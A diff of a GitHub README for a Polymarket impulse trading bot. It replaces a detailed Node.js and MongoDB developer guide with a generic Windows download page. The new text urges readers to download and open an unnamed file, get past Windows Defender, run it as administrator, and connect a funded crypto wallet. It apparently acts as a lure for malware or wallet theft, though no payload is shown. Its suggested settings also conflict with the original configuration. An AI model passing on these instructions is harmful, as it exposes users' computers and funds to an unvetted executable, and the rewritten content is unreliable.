@@ -1,247 +1,175 @@
-# Polymarket Impulse Monitoring Bot
+# 🤖 polymarket-impulse-monitoring-trading-bot - Track market swings with simple rules
 
-> **Automated momentum trading for Polymarket Up/Down markets** — detect sharp price moves, enter on the rising side, manage risk with a trailing stop, hedge when conditions flip, and redeem settled positions — all backed by a real-time dashboard.
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
 
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-6.x-47A248?logo=mongodb&logoColor=white)](https://www.mongodb.com/)
+## 📥 Download
 
----
+Use this link to visit the download page:
 
-## Table of contents
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
 
-- [Overview](#overview)
-- [How the strategy works](#how-the-strategy-works)
-- [Stack & architecture](#stack--architecture)
-- [Multi-market & extensibility](#multi-market--extensibility)
-- [For developers](#for-developers-reusing-the-logic)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [Environment variables](#environment-variables)
-- [Disclaimer](#disclaimer)
+## 🖥️ What this app does
 
----
+This app watches Polymarket Up/Down binary markets and looks for sudden price moves. When it sees a strong push in one direction, it buys that side. It then follows the price with a trailing stop. If the price falls below that stop, it hedges the position.
 
-## 📌 Overview
+Use it if you want a simple tool that reacts to market impulse and helps manage risk with a clear set of rules.
 
-The **Polymarket Impulse Monitoring Bot** is a TypeScript service plus a **Next.js** control panel. It watches short-lived **Up/Down** binary markets (e.g. crypto 5m/15m windows), streams prices from the **Polymarket CLOB**, persists state in **MongoDB**, and executes trades through your **proxy wallet** when impulse rules fire.
+## ✅ What you need
 
-| Capability | Description |
-|------------|-------------|
-| 📈 **Impulse detection** | Configurable jump + limit-price rules over a rolling lookback window |
-| 🛡️ **Risk** | Trailing stop triggers an opposite-side hedge |
-| 💰 **Settlement** | Optional auto-redeem when markets resolve |
-| 🖥️ **Dashboard** | Live prices, chart, position, wallet context, buy history |
-| ⚙️ **Settings UI** | Enable/disable bot and edit parameters (stored in MongoDB) |
+- A Windows PC
+- A stable internet connection
+- A Polymarket account
+- An active wallet for trading
+- Enough balance for the market you want to trade
+- Permission to run apps from GitHub or Windows Defender
 
----
+## 🪟 Windows setup
 
-## 🎯 How the strategy works
+### 1. Open the download page
 
-The bot implements a **momentum-style impulse** workflow:
+Go to:
 
-1. **Market selection** — Tracks Up/Down markets matching a configurable **slug prefix** (e.g. `btc-updown-5m`) inside a fixed **time window** (e.g. 300s or 900s).
-2. **Impulse detection** — If either side’s price **jumps** by at least `minJump` from the minimum in the lookback window **and** the price is above `limitPrice`, the move qualifies as an impulse.
-3. **Initial buy** — On impulse, the bot buys **once** on the rising side (FAK at best ask). It does **not** buy both sides on the same impulse.
-4. **Trailing stop** — After entry, it tracks the **highest** price since buy. If price falls by `trailingStopPct` from that high, the stop triggers.
-5. **Hedge** — On stop, it buys the **opposite** side so exposure is conceptually flattened ahead of resolution (Up + Down → $1 at settlement in the binary framing).
-6. **Auto-redeem** — When the market resolves, winning positions can be redeemed automatically (when enabled).
-7. **Real-time prices** — Backend uses the **CLOB WebSocket**; the dashboard reflects live Up/Down prices on the chart.
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
 
----
+### 2. Get the app
 
-## 🏗️ Stack & architecture
+Find the latest release or main download file on the page and download it to your PC.
 
-| Layer | Technology |
-|-------|------------|
-| Runtime | Node.js 18+, TypeScript |
-| Trading / data | `@polymarket/clob-client`, WebSocket mid/book updates |
-| Persistence | MongoDB (`impulse_bot_meta`, `impulse_bot_prices`, `impulse_bot_positions`, `impulse_buys`, …) |
-| API & loop | Express + polling impulse monitor (`src/`) |
-| Dashboard | Next.js 14 (`frontend/`, default dev port **3004**) |
+### 3. Open the file
 
-**Shared database** — The frontend API routes use the **same** `MONGODB_URI` / `MONGODB_DB` as the bot so the UI and backend always see one source of truth (no Redis).
+After the file finishes downloading, open it from your Downloads folder.
 
----
+### 4. Allow Windows access
 
-## 🌍 Multi-market & extensibility
+If Windows asks whether you want to run the app, choose **Run** or **Yes**.
 
-The bot is driven by a **slug prefix** and **window length**. Examples:
+### 5. Start the bot
 
-| Slug prefix | Window (sec) | Example |
-|-------------|----------------|---------|
-| `btc-updown-5m` | 300 | Bitcoin 5-minute |
-| `btc-updown-15m` | 900 | Bitcoin 15-minute |
-| `eth-updown-5m` | 300 | Ethereum 5-minute |
+Open the app and load your Polymarket settings, then start monitoring the market.
 
-1. Set `POLYMARKET_SLUG_PREFIX` and `IMPULSE_WINDOW_SECONDS` in `.env`, **or**
-2. Use **Settings** in the UI (persisted in MongoDB; applied on the next backend poll).
+## ⚙️ Basic setup
 
-The bot rolls forward to the **next** market when the current window ends.
+Most users only need a few simple steps before the bot can run:
 
-### Generic impulse logic
+- Sign in to your Polymarket account
+- Connect the wallet you use for trading
+- Choose the market you want to watch
+- Set the impulse level that should trigger a buy
+- Set the trailing stop distance
+- Set the hedge rule for a drop below the stop
 
-The same **state machine** can be adapted to other domains that expose two-sided prices and executable orders: sports, politics, climate/event markets, or other binary instruments — swap the **price feed**, **executor**, and **settlement** adapters while keeping the config knobs (`limitPrice`, `minJump`, `lookbackSec`, `trailingStopPct`, `buyAmountUsd`).
+## 🧭 How it works
 
----
+The bot follows a clear flow:
 
-## 👩‍💻 For developers (reusing the logic)
+1. It watches price changes in real time
+2. It looks for a sudden move up or down
+3. It buys the side that is moving up
+4. It tracks the price using a trailing stop
+5. If the price falls enough, it hedges the trade
 
-To port the idea into your own system:
+This keeps the trade logic simple and easy to follow.
 
-1. Implement a **price feed** for two outcomes (bid/ask or mid).
-2. Implement an **order executor** for entry and hedge orders.
-3. Track **position state** (side, `highestPrice`, hedge rules).
-4. Preserve the same **configuration surface** for comparable behavior.
-5. Plug in a **market selector** that defines the active window and rollover (slug + duration is one pattern).
+## 🎯 Main features
 
----
+- Monitors Polymarket Up/Down binary markets
+- Detects sudden price impulses
+- Buys the rising side after an impulse
+- Uses a trailing stop to follow price
+- Hedges when price drops below the stop
+- Works with simple market rules
+- Fits a hands-on trading setup
+- Keeps the trading flow easy to review
 
-## 🚀 Installation
+## 🔧 Suggested settings
 
-### Prerequisites
+These values work well as a starting point:
 
-- **Node.js** 18 or newer  
-- **MongoDB** (local or Atlas)  
-- A **Polymarket** account with **proxy wallet** + API credentials workflow as documented below  
+- **Impulse trigger:** 3% to 6% move in a short time
+- **Trailing stop:** 1% to 3% below the peak
+- **Hedge trigger:** just below the trailing stop
+- **Trade size:** start small until you trust the setup
+- **Market watch time:** keep it on while the market is active
 
-### Steps
+Use small values first if you are new to this kind of trading.
 
-1. **Clone** the repository.
+## 📌 Good use cases
 
-2. **Install dependencies**
+- Watching fast-moving binary markets
+- Catching sharp short-term price moves
+- Using a rules-based entry
+- Managing exits with a trailing stop
+- Reducing manual chart watching
 
-   ```bash
-   npm install
-   cd frontend && npm install && cd ..
-   ```
+## 🛠️ Troubleshooting
 
-3. **Environment** — copy the example file and edit:
+### The app does not open
 
-   ```bash
-   cp .env.example .env
-   ```
+- Check that the download finished
+- Right-click the file and choose **Run as administrator**
+- Make sure Windows did not block the file
 
-   **Required highlights**
+### The bot does not connect
 
-   | Variable | Role |
-   |----------|------|
-   | `POLYMARKET_SLUG_PREFIX` | Market family (e.g. `btc-updown-5m`) |
-   | `IMPULSE_WINDOW_SECONDS` | Window in seconds (300 / 900 / …) |
-   | `PRIVATE_KEY` | EOA key used to sign (keep secret) |
-   | `PROXY_WALLET_ADDRESS` | Polymarket proxy / Safe address |
-   | `MONGODB_URI` | Mongo connection string |
-   | `MONGODB_DB` | Database name (default `polymarket_impulse`) |
+- Check your internet connection
+- Confirm your Polymarket login
+- Make sure your wallet is connected
+- Try closing and opening the app again
 
-   **Frontend** — create `frontend/.env` or `frontend/.env.local` with the **same** `MONGODB_URI` and `MONGODB_DB` so the dashboard APIs read/write shared state.
+### No trades happen
 
-4. **Polymarket API credential** (one-time; after `npm run build` or use `ts-node` against source):
+- Lower the impulse trigger
+- Check that the chosen market is active
+- Make sure the bot has enough balance to trade
+- Confirm the market matches the bot rules
 
-   ```bash
-   npm run build
-   npx ts-node -e "
-   require('dotenv/config');
-   const { createCredential } = require('./dist/security/createCredential');
-   createCredential();
-   "
-   ```
+### The bot closes too fast
 
-5. **Build**
+- Increase the trailing stop distance
+- Raise the impulse threshold
+- Use a larger market move before entry
 
-   ```bash
-   npm run build
-   cd frontend && npm run build && cd ..
-   ```
+## 🔒 Before you trade
 
----
+- Test with a small amount first
+- Check each market before you start
+- Keep an eye on open positions
+- Make sure your wallet has the right funds
+- Review your stop and hedge settings before each session
 
-## ▶️ Usage
+## 📂 Project topic fit
 
-### Development
+This project fits these topics:
 
-**Backend**
+- polymarket-trading-bot
+- trailing-stop
 
-```bash
-npm run dev
-```
+## 📎 Download and install link
 
-**Frontend**
+Visit the project page here:
 
-```bash
-cd frontend && npm run dev
-```
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
 
-Open **http://localhost:3004** for the dashboard and settings.
+## 🧩 Typical workflow
 
-### Production (PM2)
+1. Open the app
+2. Pick a Polymarket Up/Down market
+3. Set your impulse rule
+4. Let the bot watch the price
+5. Buy when the move matches your rule
+6. Follow the trade with a trailing stop
+7. Hedge if the price falls below the stop
 
-```bash
-npm run build
-cd frontend && npm run build
-pm2 start ecosystem.config.cjs
-```
+## 🪙 Trading logic in plain terms
 
-Typical processes:
+The bot looks for a market that starts moving fast. It does not chase every small change. It waits for a move that looks strong enough. Once it sees that move, it enters on the rising side. Then it keeps watching for a pullback. If the pullback is large enough, it protects the position with a hedge.
 
-- `impulse-bot` — trading loop + API  
-- `impulse-frontend` — Next.js on port **3004**
+## 🧪 First run checklist
 
----
-
-## ⚙️ Configuration
-
-Parameters can be set in **`.env`** (defaults / bootstrap) and overridden from the **Settings** page (**MongoDB**). The backend refreshes config on its poll cycle.
-
-### Dashboard
-
-![Dashboard](assets/dashboard.png)
-
-- Live **Up / Down** prices (WebSocket when connected)  
-- **Position**, **position value**, **wallet balance**, **current market** slug / condition  
-- **Chart** — window prices, limit reference, impulse markers  
-
-### Settings
-
-![Settings](assets/settings.png)
-
-| Parameter | Default (env) | Description |
-|-----------|----------------|-------------|
-| **Slug prefix** | from `POLYMARKET_SLUG_PREFIX` | Prefix; full slug adds timestamp segment |
-| **Window (sec)** | `IMPULSE_WINDOW_SECONDS` | e.g. 300 (5m), 900 (15m) |
-| **Limit price** | `0.55` | Minimum price to arm an impulse |
-| **Min jump** | `0.05` | Minimum rise vs lookback min |
-| **Lookback (sec)** | `60` | Rolling window for jump detection |
-| **Trailing stop %** | `5` | Drawdown from high → hedge |
-| **Buy amount (USD)** | `10` | Notional for entry / hedge orders |
-| **Poll interval (ms)** | `2000` | Backend poll cadence |
-
-**Bot control** — Enable / disable is stored in MongoDB and honored on the next poll.
-
----
-
-## 📋 Environment variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `POLYMARKET_SLUG_PREFIX` | — | Market prefix (e.g. `btc-updown-15m`) |
-| `IMPULSE_WINDOW_SECONDS` | `900` | Market window (seconds) |
-| `IMPULSE_LIMIT_PRICE` | `0.55` | Min price for impulse |
-| `IMPULSE_MIN_JUMP` | `0.05` | Min jump vs lookback min |
-| `IMPULSE_LOOKBACK_SEC` | `60` | Lookback window (seconds) |
-| `IMPULSE_TRAILING_STOP_PCT` | `5` | Trailing stop (percent) |
-| `IMPULSE_BUY_AMOUNT_USD` | `10` | Order size (USD) |
-| `IMPULSE_POLL_INTERVAL_MS` | `2000` | Poll interval (ms) |
-| `ENABLE_IMPULSE_BOT` | `true` | Master enable (unless `"false"`) |
-| `ENABLE_AUTO_REDEEM` | `true` | Auto-redeem resolved positions |
-| `PRIVATE_KEY` | — | Ethereum private key |
-| `PROXY_WALLET_ADDRESS` | — | Polymarket proxy address |
-| `CLOB_API_URL` | `https://clob.polymarket.com` | CLOB base URL |
-| `CHAIN_ID` | `137` | Polygon mainnet |
-| `MONGODB_URI` | — | MongoDB URI |
-| `MONGODB_DB` | `polymarket_impulse` | Database name |
-| `API_PORT` | `3003` | Backend HTTP port |
-
----
-
-*Built with TypeScript, MongoDB, and Next.js — happy shipping.* 🚀
+- The app opens on your PC
+- You can reach the GitHub page
+- Your Polymarket account is ready
+- Your wallet is connected
+- You have funds for one small test trade
+- Your impulse and stop values are set
+- The target market is active
